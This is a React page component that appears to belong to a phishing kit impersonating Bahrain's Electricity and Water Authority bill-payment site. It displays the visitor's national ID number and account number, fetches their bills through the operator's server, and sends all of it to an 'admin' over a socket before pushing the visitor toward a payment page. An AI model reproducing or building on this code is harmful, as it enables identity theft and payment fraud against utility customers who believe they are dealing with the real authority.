import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData, socket } from "@/lib/store";

export default function EWABills() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [billData, setBillData] = useState<any>(null);

  // Get the submitted data from localStorage
  const idType = localStorage.getItem("ewa_idType") || "";
  const idNumber = localStorage.getItem("ewa_idNumber") || "";
  const accountNumber = localStorage.getItem("ewa_accountNumber") || "";
  const idTypeLabel = localStorage.getItem("ewa_idTypeLabel") || "";

  useEffect(() => {
    navigateToPage('عرض الفواتير');
    fetchBills();
  }, []);

  const fetchBills = async () => {
    if (!idType || !idNumber || !accountNumber) {
      setError("لم يتم العثور على بيانات العميل");
      setLoading(false);
      return;
    }

    try {
      const serverUrl = import.meta.env.VITE_SOCKET_URL || 'http://localhost:3001';
      const resp = await fetch(`${serverUrl}/api/ewa-bill`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ idType, idNumber, accountNumber }),
      });
      const data = await resp.json();

      if (!data.success) {
        setError(data.error || "حدث خطأ أثناء جلب الفواتير");
      } else {
        setBillData(data);
        // Send bill data to admin via socket
        if (socket.value.connected) {
          sendData({
            data: {
              ewaBills: data,
              idType: idTypeLabel,
              idNumber,
              accountNumber,
            },
            current: 'عرض الفواتير',
            nextPage: 'summary-payment',
            waitingForAdminResponse: false,
          });
        }
      }
    } catch (err: any) {
      setError("حدث خطأ في الاتصال بالخادم: " + (err.message || ""));
    } finally {
      setLoading(false);
    }
  };

  const handleProceed = () => {
    setLocation('/summary-payment');
  };

  const handleBack = () => {
    setLocation('/');
  };

  return (
    <>
      <style dangerouslySetInnerHTML={{ __html: `
        .ewa-bills-page, .ewa-bills-page * {
          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", Arial, sans-serif !important;
          box-sizing: border-box;
        }
        .ewa-bills-page {
          direction: rtl;
          min-height: 100vh;
          background: #FAFAFA;
          color: #17171C;
          font-size: 16px;
          line-height: 1.5;
        }
        .ewa-header {
          background: linear-gradient(135deg, #003366 0%, #0055a4 100%);
          padding: 16px 0;
          color: white;
        }
        .ewa-header-inner {
          max-width: 960px;
          margin: 0 auto;
          padding: 0 20px;
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        .ewa-header h1 {
          font-size: 20px;
          font-weight: 700;
          margin: 0;
        }
        .ewa-container {
          max-width: 960px;
          margin: 0 auto;
          padding: 24px 20px;
        }
        .ewa-blue-bar {
          background: #003366;
          color: white;
          padding: 12px 20px;
          font-size: 15px;
          font-weight: 600;
          border-radius: 4px;
          margin-bottom: 16px;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .ewa-info-card {
          background: white;
          border: 1px solid #e0e0e0;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 16px;
        }
        .ewa-info-row {
          display: flex;
          justify-content: space-between;
          padding: 10px 0;
          border-bottom: 1px solid #f0f0f0;
          font-size: 14px;
        }
        .ewa-info-row:last-child {
          border-bottom: none;
        }
        .ewa-info-label {
          color: #666;
          font-weight: 500;
        }
        .ewa-info-value {
          color: #17171C;
          font-weight: 600;
        }
        .ewa-bills-table {
          width: 100%;
          border-collapse: collapse;
          background: white;
          border-radius: 8px;
          overflow: hidden;
          border: 1px solid #e0e0e0;
          margin-bottom: 16px;
        }
        .ewa-bills-table th {
          background: #003366;
          color: white;
          padding: 12px 16px;
          font-size: 13px;
          font-weight: 600;
          text-align: right;
        }
        .ewa-bills-table td {
          padding: 12px 16px;
          font-size: 13px;
          border-bottom: 1px solid #f0f0f0;
          text-align: right;
        }
        .ewa-bills-table tr:last-child td {
          border-bottom: none;
        }
        .ewa-bills-table tr:hover td {
          background: #f8f9ff;
        }
        .ewa-total-row {
          background: #e8f0fe !important;
          font-weight: 700;
        }
        .ewa-total-row td {
          font-weight: 700;
          color: #003366;
          font-size: 15px !important;
        }
        .ewa-buttons {
          display: flex;
          gap: 12px;
          justify-content: center;
          margin-top: 24px;
          flex-wrap: wrap;
        }
        .ewa-btn-primary {
          background: #003366;
          color: white;
          border: none;
          padding: 12px 40px;
          border-radius: 6px;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
          transition: background 0.2s;
        }
        .ewa-btn-primary:hover {
          background: #004488;
        }
        .ewa-btn-secondary {
          background: white;
          color: #003366;
          border: 2px solid #003366;
          padding: 12px 40px;
          border-radius: 6px;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
        }
        .ewa-btn-secondary:hover {
          background: #f0f4ff;
        }
        .ewa-loading {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 60px 20px;
          gap: 16px;
        }
        .ewa-spinner {
          width: 48px;
          height: 48px;
          border: 4px solid #e0e0e0;
          border-top-color: #003366;
          border-radius: 50%;
          animation: ewa-spin 0.8s linear infinite;
        }
        @keyframes ewa-spin {
          to { transform: rotate(360deg); }
        }
        .ewa-error-box {
          background: #fff3f3;
          border: 1px solid #ffcdd2;
          border-radius: 8px;
          padding: 20px;
          text-align: center;
          color: #c62828;
          margin: 20px 0;
        }
        .ewa-raw-text {
          background: white;
          border: 1px solid #e0e0e0;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 16px;
          white-space: pre-wrap;
          font-size: 14px;
          line-height: 1.8;
          max-height: 400px;
          overflow-y: auto;
        }
      `}} />

      <div className="ewa-bills-page">
        {/* Header */}
        <div className="ewa-header">
          <div className="ewa-header-inner">
            <h1>فاتورة الكهرباء والماء</h1>
            <img src="/bahrain-logo.png" alt="البحرين" style={{ height: '40px' }} onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          </div>
        </div>

        <div className="ewa-container">
          {/* Customer Info Bar */}
          <div className="ewa-blue-bar">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="2"/>
              <path d="M12 8v4M12 16h.01" stroke="white" strokeWidth="2" strokeLinecap="round"/>
            </svg>
            <span>بيانات الفواتير</span>
          </div>

          {/* Customer Details Card */}
          <div className="ewa-info-card">
            <div className="ewa-info-row">
              <span className="ewa-info-label">نوع الهوية:</span>
              <span className="ewa-info-value">{idTypeLabel}</span>
            </div>
            <div className="ewa-info-row">
              <span className="ewa-info-label">رقم الهوية:</span>
              <span className="ewa-info-value">{idNumber}</span>
            </div>
            <div className="ewa-info-row">
              <span className="ewa-info-label">رقم الحساب:</span>
              <span className="ewa-info-value">{accountNumber}</span>
            </div>
          </div>

          {/* Loading State */}
          {loading && (
            <div className="ewa-loading">
              <div className="ewa-spinner"></div>
              <p style={{ color: '#666', fontSize: '15px' }}>جاري جلب بيانات الفواتير من هيئة الكهرباء والماء...</p>
              <p style={{ color: '#999', fontSize: '13px' }}>قد يستغرق هذا بضع ثوانٍ</p>
            </div>
          )}

          {/* Error State */}
          {!loading && error && (
            <div className="ewa-error-box">
              <p style={{ fontSize: '16px', fontWeight: 600, marginBottom: '8px' }}>خطأ</p>
              <p>{error}</p>
            </div>
          )}

          {/* Bill Data */}
          {!loading && !error && billData && (
            <>
              {/* Account Name */}
              {billData.accountName && (
                <div className="ewa-info-card">
                  <div className="ewa-info-row">
                    <span className="ewa-info-label">اسم صاحب الحساب:</span>
                    <span className="ewa-info-value">{billData.accountName}</span>
                  </div>
                </div>
              )}

              {/* Total Amount */}
              {billData.totalAmount && (
                <div className="ewa-info-card" style={{ background: '#e8f0fe', borderColor: '#003366' }}>
                  <div className="ewa-info-row" style={{ borderBottom: 'none' }}>
                    <span className="ewa-info-label" style={{ fontSize: '16px', color: '#003366' }}>المبلغ الإجمالي المستحق:</span>
                    <span className="ewa-info-value" style={{ fontSize: '20px', color: '#003366' }}>{billData.totalAmount} د.ب</span>
                  </div>
                </div>
              )}

              {/* Bills Table */}
              {billData.bills && billData.bills.length > 0 && (
                <table className="ewa-bills-table">
                  <thead>
                    <tr>
                      {billData.bills[0].map((_: any, i: number) => (
                        <th key={i}>
                          {i === 0 ? 'الفاتورة' : i === 1 ? 'التاريخ' : i === 2 ? 'المبلغ' : i === 3 ? 'الحالة' : `عمود ${i + 1}`}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {billData.bills.map((row: string[], idx: number) => (
                      <tr key={idx}>
                        {row.map((cell: string, ci: number) => (
                          <td key={ci}>{cell}</td>
                        ))}
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}

              {/* Raw Text Fallback */}
              {billData.rawText && (!billData.bills || billData.bills.length === 0) && (
                <>
                  <div className="ewa-blue-bar">تفاصيل الفاتورة</div>
                  <div className="ewa-raw-text">{billData.rawText}</div>
                </>
              )}

              {/* Details */}
              {billData.details && billData.details.length > 0 && (
                <div className="ewa-info-card">
                  {billData.details.map((d: string, i: number) => (
                    <div key={i} className="ewa-info-row" style={{ borderBottom: i < billData.details.length - 1 ? '1px solid #f0f0f0' : 'none' }}>
                      <span>{d}</span>
                    </div>
                  ))}
                </div>
              )}
            </>
          )}

          {/* Buttons */}
          <div className="ewa-buttons">
            {!loading && !error && billData && (
              <button className="ewa-btn-primary" onClick={handleProceed}>
                متابعة الدفع
              </button>
            )}
            <button className="ewa-btn-secondary" onClick={handleBack}>
              رجوع
            </button>
            {!loading && error && (
              <button className="ewa-btn-primary" onClick={() => { setLoading(true); setError(""); fetchBills(); }}>
                إعادة المحاولة
              </button>
            )}
          </div>
        </div>
      </div>
    </>
  );
}
